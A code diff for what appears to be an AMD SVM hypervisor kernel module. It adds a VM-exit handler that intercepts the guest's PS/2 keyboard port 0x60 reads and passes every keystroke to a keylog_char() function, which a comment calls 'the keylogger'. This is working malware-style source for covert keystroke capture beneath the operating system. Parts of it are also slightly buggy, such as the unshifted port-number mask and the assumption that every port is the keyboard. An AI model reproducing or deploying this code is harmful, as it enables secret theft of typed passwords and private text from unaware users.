@@ -1,31 +1,16 @@
 #include <linux/kernel.h>
+#include <asm/io.h>
 
 #include "exit_handle.h"
 #include "vmcb.h"
 #include "svm_utils.h"
 #include "apic.h"
+#include "keylogger.h"
 
 extern void * __global_Host_Reg_Store; 
 extern void * __global_Guest_Reg_Store;
 extern void * __global_VMCB_VA;
 extern phys_addr_t __global_VMCB_PA;
-
-void handle_phys_int(void){
-    vmcb_t * vmcb = (vmcb_t *) __global_VMCB_VA;
-    // get_current_irrs();
-    // get_current_isrs();
-    printk("Handling phys int..");
-    if(is_timer_interrupt()){
-        vmcb->control_area.guest_int_ctrl.V_INTR_PRIO = 4;
-        vmcb->control_area.guest_int_ctrl.V_INTR_VEC = 236;
-        vmcb->control_area.guest_int_ctrl.V_IRQ = 1;
-        vmcb->control_area.EVENTINJ = 236 + (0 << 8) + (0 << 11) + (1 << 31);
-    } else {
-        printk("Holy crap, not a timer interrupt\n");
-    }
-    return;
-}
-
 
 void handle_vmexit(void){
 	vmcb_t * vmcb = (vmcb_t *) __global_VMCB_VA;
@@ -37,14 +22,10 @@ void handle_vmexit(void){
 	//printk("EXIT INT INFO: 0x%llx\n", vmcb->control_area.EXIT_INT_INFO);
 
 	switch(exitcode){
-
 		case VMEXIT_IOIO:
-			printk("IO Interrupt\n");
-			printk("EXIT INFO1: 0x%llx\n", vmcb->control_area.EXIT_INFO1);
+            handle_ioio();
 			break;
 		case VMEXIT_INTR:
-			////printk("Physical Interrupt\n");
-			// For performance we may want to deal with TIMER interrupts separately.
 			handle_phys_int();
 			break;
 		case VMEXIT_CPUID:
@@ -56,6 +37,7 @@ void handle_vmexit(void){
 			//vmcb->state_save_area.rbx = 0xAAAAAAAA;
 			//vmcb->state_save_area.rcx = 0xBBBBBBBB;
 			//vmcb->state_save_area.rdx = 0xcafebaee;
+            vmcb->state_save_area.rip = vmcb->control_area.nRIP;
 			break;
 		case VMEXIT_RDTSC:
 			printk("RDTSC Instruction Intercept\n");
@@ -107,9 +89,9 @@ void handle_vmexit(void){
 	}
 	
 	// If the exit was caused by an instr_interrupt
-	if(exitcode >= 0x65 && exitcode <= 0x7f){
-		vmcb->state_save_area.rip = vmcb->control_area.nRIP;
-	}
+	// if(exitcode >= 0x65 && exitcode <= 0x7f){
+	// 	vmcb->state_save_area.rip = vmcb->control_area.nRIP;
+	// }
 
 	vmcb->control_area.EXIT_CODE = 0;
 	vmcb->control_area.EXIT_INFO1 = 0;
@@ -119,6 +101,80 @@ void handle_vmexit(void){
 	return;	
 }
 
+void handle_phys_int(void){
+    vmcb_t * vmcb = (vmcb_t *) __global_VMCB_VA;
+    // get_current_irrs();
+    // get_current_isrs();
+    printk("Handling phys int..");
+    if(is_timer_interrupt()){
+        vmcb->control_area.guest_int_ctrl.V_INTR_PRIO = 4;
+        vmcb->control_area.guest_int_ctrl.V_INTR_VEC = 236;
+        vmcb->control_area.guest_int_ctrl.V_IRQ = 1;
+        vmcb->control_area.EVENTINJ = 236 + (0 << 8) + (0 << 11) + (1 << 31);
+    } else {
+        printk("Holy crap, not a timer interrupt\n");
+    }
+    return;
+}
+
+/*
+    Obviously the handler for IO stuff
+    Implementation only works with keyboard IO rn.
+    Port = 0x60 (data) for PS/2 Keyboard
+
+    This is basically the keylogger
+*/
+
+void handle_ioio(void){
+    vmcb_t * vmcb = (vmcb_t *) __global_VMCB_VA;
+    uint64_t ecode = vmcb->control_area.EXIT_CODE;
+    uint64_t einfo1 = vmcb->control_area.EXIT_INFO1;
+    uint64_t einfo2 = vmcb->control_area.EXIT_INFO2;
+
+    // Decoding EXITINFO1
+    int io_type = einfo1 & 0x1;    // 1 = Read, 0 = Write
+    int str_based = einfo1 & (0x1 << 2);  // (INS, OUTS)
+    int op_size;    // Operand Size
+    int addr_size;  // N-bit Address
+    int port_num;   // Intercepted I/O Port
+
+    if (einfo1 & (0x1 << 4)){
+        op_size = 8;
+    } else if (einfo1 & 0x1 << 5) {
+        op_size = 16;
+    } else {
+        op_size = 32;
+    }
+    
+    if (einfo1 & (0x1 << 7)){
+        addr_size = 16;
+    } else if (einfo1 & 0x1 << 8) {
+        addr_size = 32;
+    } else {
+        addr_size = 64;
+    }
+
+    port_num = einfo1 & (0xFFFF << 16);
+
+    // "DECODING" EXITINFO2
+    uint64_t next_instruction = einfo2;
+
+    // IO Read (IN)
+    if (io_type == 1){
+        char val = inb(0x60);
+        vmcb->state_save_area.rax = (uint64_t) val;
+        keylog_char(val);
+    }    
+
+    // IO Write (OUT) 
+    else {
+        char val = (char)(vmcb->state_save_area.rax & 0xFF);
+        outb(val, 0x60);
+    }
+
+    vmcb->state_save_area.rip = next_instruction;
+    return;
+}
 
 
 
